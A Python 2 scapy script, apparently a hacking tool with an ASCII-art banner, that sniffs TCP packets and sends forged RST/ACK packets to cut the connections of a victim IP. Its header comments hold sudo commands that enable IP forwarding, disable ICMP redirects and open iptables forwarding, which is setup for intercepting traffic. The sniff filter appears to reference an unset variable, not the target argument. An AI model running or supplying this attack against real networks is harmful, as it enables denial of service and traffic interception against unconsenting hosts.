#!/usr/bin/python

'''
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/eno1/send_redirects'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp2s0/send_redirects'
sudo iptables -P FORWARD ACCEPT
sudo iptables -P INPUT ACCEPT

//:///////::::::::::::------------------------------------------------------------:::::://////ossoys
:::sdhhhhhhhhhyyyyyyyyyyyyyysssssoooo++++++//////////::::::/o/://::::://+////////+++++++++++++ssssoy
:::ydddddhhhhhyyyhhhhhhhhhhhhhhhhyyyyyysssooooooo++++//////ossyhhhhyyhhhhhyyyyssyyyyyyyyyhyyhhhhs+o+
:::shhhhyyyhdmmmmmdhysyyyyyyyyyyyyyyyyyyyyyyyyyyyyysshhhhhhhdhhyyyyyyyyyyhhyyyyyyyyyyyyyyyyyyyyys///
:::yhhhyymNNNNNNNNNNNmhsyyyyyyyyyyyyyyyyyyyyyyyyyyyyymNNNNNNNNNNNdsyyyyyyyyyyyyyyyyyyyyyyyyyyyyyo//o
:::yhhhsNNNNNNh+yNNNNNNyyyyyyhhhhhhyssyyyyysyysyyyyyhNNNNNmydmmNNNmohyyyhhhdhhhyyssyyyyyyoyhsyyyo//s
:::yhhyhNNNNNNs:oNNNNNNdoydNNNNNNNNNmmNNNNNdsysNNNNNNNNNNNh-/mmNNNNoydmNNNNNNNNNmyhNNNNNdhNNysyyo:/+
:::o+++hNNNNNNs:/yyyyyysoNNNNNmoyNNNNNNNNNNN+/sNNNNNmNNNNNd-/NNNNNNoNNNNNmosNNNNNNmNNNNNNNNNh////:::
:::o+++hNNNNNNs:::::::::hNNNNNh:/NNNNNNNNNNNs/yNNNNNhNNNNNmydNNNmdysNNNNNd::NNNNh+++dNNNNNmmh:///::/
:::o+++hNNNNNNsohhhhhhhhooooooo/sNNNNNNNNNNNd/dNNNNmsNNNNNNNNNNNdy/ohhhhhh+sNNNds+++sdNNNdo++////::/
:::o+++hNNNNNNssNNNNNNNN+:/+shdmNNNNNNNdNNNNN/mNNNNhsNNNNNmoyNNNNNNo:/oydmNNNNN/::--:/mNNo++++++/:::
::/yyyshNNNNNNs/oNNNNNNNshmNNNNdsNNNNNNoNNNNNsNNNNNyyNNNNNd-:NNNNNNmhmNNNNdomNN//:--/:NNNssssssss:::
::/yyyshNNNNNNs::NNNNNNNmNNNNNm::NNNNNN+hNNNNmNNNNNosNNNNNd-:mNNNNNNNNNNNN/-dNNy+::::sNNNssyyyyys:::
::/yyyyyNNNNNNs:/NNNNNNNNNNNNNd::NNNNNN++NNNNNNNNNNosNNNNNm/+NNNNNNNNNNNNN/-hNNNs/:/:NNNNssyyyyys:::
::/yhyysmNNNNNmyhNNNNNNNmNNNNNNssNNNNNNo:dNNNNNNNNdssNNNNNNmNNNNNNNdNNNNNNdymNNNy::+:mNNNyyyyyyyy:::
::/hdddhydNNNNNNNNdNNNNNymNNNNNNdmNNNNNo:yNNNNNNNNydsNNNNNNNNmmmmdhyydNNNNNdyNNNy:/+:mmmmyhdddddd/::
::/hddddddhhdddddhhyhhhhyhhddddhyhhhhhydmmNNNNNNNdydyyyyyyyyyyyyyhhhhysyyyyhsyhyssssssyhysyhhhddd/::
::/dddddddddddhyhhhhhhdhhhhhyyhhddddddyhddddddddhhdddososoyoosssoossoo+ysshyysyoyssysyohsssyohddd/::
::/ddddddddddddhhdddddddddddddhdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/:/
::/dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNNNNNNNNNNNmmmmmmmmmmmmmm+::
::/dmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmddh+:/
::/ohdmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmdddddddddddddddddddhs/::::+
:::+syyyyyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddddddddddddddddddddddddddddddddddddddhyo/::///

'''

import sys
from scapy.all import *
from time import sleep

if len(sys.argv) != 2:
  print "Usage:", sys.argv[0], '[ip src]'
  print 'Example:', sys.argv[0], '11.22.33.44'
  exit(1)


# some global parameters and objects
SOURCE=sys.argv[1]
ip=IP()
tcp=TCP()


def parse_packet(p):
  print "[+] DBG inside function"
  if p.haslayer(TCP) and p[TCP].flags in [ 2, 16, 24 ]: # S,A,PA
      ip.src=p[IP].dst
      ip.dst=SOURCE
      tcp.sport=p[TCP].sport
      tcp.dport=p[TCP].dport
      tcp.seq=0
      tcp.ack=p[TCP].seq+1
      tcp.flags='RA'
      send(ip/tcp, verbose=0)
      print '[+] sent RST/ACK from', p[IP].src, 'to', p[IP].dst, 'source port', tcp.sport, 'remote port', p[TCP].dport


if __name__ == '__main__':
  print '[+] waiting for [S], [A] or [PA] packets...'
  sniff(filter='host ' + ip.src, prn=parse_packet)
